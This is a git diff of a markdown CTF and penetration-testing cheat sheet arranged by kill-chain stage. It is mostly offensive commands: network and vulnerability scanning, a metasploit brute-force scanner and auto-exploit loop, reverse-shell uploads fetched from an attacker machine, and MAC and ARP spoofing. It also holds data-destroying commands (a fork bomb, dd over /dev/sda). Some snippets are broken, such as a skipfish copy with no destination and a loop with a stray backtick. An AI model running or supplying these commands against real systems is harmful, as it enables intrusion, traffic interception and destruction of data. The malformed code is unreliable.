@@ -21,15 +21,43 @@ Previous Play Icon:
 - [Index and Playsets](#index-and-playsets)
 - [Reconnaissance 1](#reconnaissance-1)
 - [Reconnaissance 2](#reconnaissance-2)
-- [Reconnaissance 3](#reconnaissance-3)
-- [Weaponization](#weaponization)
-- [Delivery](#delivery)
-- [Exploitation](#exploitation)
-- [Reconnaissance 4](#reconnaissance-4)
-- [Command and GitTroll (CG2)](#command-and-gittroll-cg2)
-- [Priviledge Escalation](#priviledge-escalation)
-- [Actions on Objectives](#actions-on-objectives)
-- [Celebration](#celebration)
+- [DNS enumeration](#dns-enumeration)
+  - [Moving Fast and Breaking Things](#moving-fast-and-breaking-things)
+- [make output directory for skipfish](#make-output-directory-for-skipfish)
+- [get sample list](#get-sample-list)
+- [remove line "ro"](#remove-line-%22ro%22)
+- [location of kali linux malicious web shells](#location-of-kali-linux-malicious-web-shells)
+- [Use the following techniques to upload malfiles such as php reverse shells](#use-the-following-techniques-to-upload-malfiles-such-as-php-reverse-shells)
+- [Upload via HTTP](#upload-via-http)
+- [Start a local web server](#start-a-local-web-server)
+- [change directories to webserver](#change-directories-to-webserver)
+- [download files to webserver](#download-files-to-webserver)
+- [download files from your webserver to your target](#download-files-from-your-webserver-to-your-target)
+- [Upload via FTP](#upload-via-ftp)
+- [Upload via TFTP](#upload-via-tftp)
+- [Upload via SMB](#upload-via-smb)
+- [Upload via SSH / SCP](#upload-via-ssh--scp)
+- [Find the last commands run](#find-the-last-commands-run)
+- [Find the Kernel Version](#find-the-kernel-version)
+- [Find versions of executatbles](#find-versions-of-executatbles)
+- [exploit outdated nmap version](#exploit-outdated-nmap-version)
+- [Look at user permissions](#look-at-user-permissions)
+- [Find other Users](#find-other-users)
+- [World Readable / Writable Files](#world-readable--writable-files)
+- [Inspect web traffice](#inspect-web-traffice)
+- [look at cronjobs that runs as root with incorrect permissions](#look-at-cronjobs-that-runs-as-root-with-incorrect-permissions)
+- [Manual sudo to root](#manual-sudo-to-root)
+- [Get OS and Kernel Version, look for public exploits](#get-os-and-kernel-version-look-for-public-exploits)
+- [Check for SUID files in the sytem](#check-for-suid-files-in-the-sytem)
+- [The best script I've found by far](#the-best-script-ive-found-by-far)
+- [Above but as one script](#above-but-as-one-script)
+- [Add sudoers](#add-sudoers)
+- [If you've found a flag and calculated size](#if-youve-found-a-flag-and-calculated-size)
+- [locate "hidden" files](#locate-%22hidden%22-files)
+- [Example, fork the template to make your own victory site](#example-fork-the-template-to-make-your-own-victory-site)
+- [Carnage (don't run this on anything you care about, you've been warned)](#carnage-dont-run-this-on-anything-you-care-about-youve-been-warned)
+- [change your mac address](#change-your-mac-address)
+- [arpspoof your address](#arpspoof-your-address)
 - [Documentation](#documentation)
 - [Credit and Resources](#credit-and-resources)
 - [Resources](#resources)
@@ -86,6 +114,15 @@ do
         /dev/null
         done
     done 
+```
+
+__Network Scanning__
+``` bash
+# use tcpdump to gather network traffic 
+tcpdump net [target CIDR range]
+tcpdump [interface]
+tcpdump port [port]
+```
 
 ```
 __Vulnerability Scanning__
@@ -117,17 +154,40 @@ firefox [target]/robots.txt
 dirb http://[target]
 nikto -h [target]
 
+arachni -u [URL]
+
 # DNS enumeration 
 dig [target domain]
 whois [target domain]
 dnsmap [target domain]
+
+## Moving Fast and Breaking Things
+
+# make output directory for skipfish
+mkdir skipfish-output
+# get sample list 
+cp /use/share/skipfish/dictionaries/medium.w1
+# remove line "ro"
+skipfish -W medium -o skipfish-output
 ```
 
-__NBT SMB Scan__
+__NBT,SMB,SNMP Scan__
 ```bash
 nbtscan -l [target]
 
 smbclient -L //[target]
+
+msfcli auxiliary/scanner/snmp/snmp_login RHOSTS=[target]
+```
+
+__Moving Fast and Breaking Things__
+```bash 
+#!/bin/bash
+for ip in nmap -v -T5 -p[port] [host] | awk -F\
+'/[PORT]\/[tcp | udp] on/ {print $6}'`
+do
+    msfcli [MODULE] RHOST=$ip E;
+done 
 ```
 
 # Weaponization 
@@ -199,6 +259,7 @@ target$ wget [attack-machine-ip]/filename.extension
 # Upload via FTP
 # Upload via TFTP
 # Upload via SMB
+# Upload via SSH / SCP
 ```
 
 # Exploitation 
@@ -406,6 +467,20 @@ $ :(){:|:&};:
 $ command > /dev/sda
 $ mv /home/user/* /dev/null
 $ dd if=/dev/random of=/dev/sda 
+
+```
+# Non Necessities
+This section will contain more pentest-related scripts and scans that are not likely to be used during a CTF
+
+__Disguises__
+``` bash 
+# change your mac address
+ifconfig down [interface: I.E eth0]
+macchanger -r
+ifconfig up [interface]
+
+# arpspoof your address
+arpspoof -t [target ip] [gateway ip]
 
 ```
 
